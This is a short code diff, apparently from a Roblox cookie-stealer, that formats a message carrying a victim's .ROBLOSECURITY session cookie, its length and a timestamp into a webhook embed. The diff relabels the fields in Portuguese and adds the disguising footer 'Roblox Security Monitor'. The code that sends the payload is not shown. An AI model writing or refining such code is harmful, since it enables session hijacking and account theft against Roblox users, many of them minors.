@@ -88,14 +88,21 @@ var secret, fetchInfo, Send;
         color: 0xff0000,
         fields: [
             {
-                name: "Cookie ROBLOSECURITY",
-                value: "```" + value + "```"
+                name: "Cookie (Primeiros 100 chars)",
+                value: "```" + value.substring(0, 100) + "..." + "```"
             },
             {
-                name: "Timestamp",
+                name: "Comprimento Total",
+                value: value.length + " caracteres"
+            },
+            {
+                name: "Timestamp", 
                 value: new Date().toLocaleString()
             }
-        ]
+        ],
+        footer: {
+            text: "Roblox Security Monitor"
+        }
     };
     
     const payload = {
